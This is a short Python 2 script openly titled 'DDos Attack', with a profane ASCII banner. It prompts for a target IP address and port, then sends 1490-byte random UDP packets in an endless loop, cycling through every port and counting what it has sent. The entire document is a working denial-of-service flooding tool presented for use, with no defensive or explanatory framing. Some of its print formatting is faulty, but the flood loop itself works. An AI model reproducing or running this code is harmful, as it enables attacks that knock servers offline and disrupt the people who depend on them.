#Fucking
import sys
import os
import time
import socket
import random
#Code Time
from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

##############
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
#############

os.system("clear")
os.system("figlet DDos Attack")
print("""
╔═══╗╔╗─╔╗╔═══╗╔╗╔═╗╔══╗╔═╗─╔╗╔═══╗────╔═══╗╔═══╗╔═══╗╔═══╗╔═╗─╔╗╔═══╗
║╔══╝║║─║║║╔═╗║║║║╔╝╚╣─╝║║╚╗║║║╔═╗║────║╔═╗║║╔═╗║║╔═╗║║╔═╗║║║╚╗║║║╔═╗║
║╚══╗║║─║║║║─╚╝║╚╝╝──║║─║╔╗╚╝║║║─╚╝────║║─╚╝║║─║║║╚═╝║║║─║║║╔╗╚╝║║║─║║
║╔══╝║║─║║║║─╔╗║╔╗║──║║─║║╚╗║║║║╔═╗────║║─╔╗║║─║║║╔╗╔╝║║─║║║║╚╗║║║╚═╝║
║║───║╚═╝║║╚═╝║║║║╚╗╔╣─╗║║─║║║║╚╩═║────║╚═╝║║╚═╝║║║║╚╗║╚═╝║║║─║║║║╔═╗║
╚╝───╚═══╝╚═══╝╚╝╚═╝╚══╝╚╝─╚═╝╚═══╝────╚═══╝╚═══╝╚╝╚═╝╚═══╝╚╝─╚═╝╚╝─╚╝""")
ip = raw_input("Enter ip : ")
port = input("Enter Port       : ")

os.system("clear")
os.system("figlet Attack Starting")
print("Starting Sent Pakets to ip")
time.sleep(5)
print("Starting Sent pakets to Port")
time.sleep(5)
print("Start Sent all Pakets to Server")
time.sleep(3)
sent = 0
while True:
     sock.sendto(bytes, (ip,port))
     sent = sent + 1
     port = port + 1
     print("Sent %s packet to %s throught port:%s")%(sent,ip,port)
     if port == 65534:
       port = 1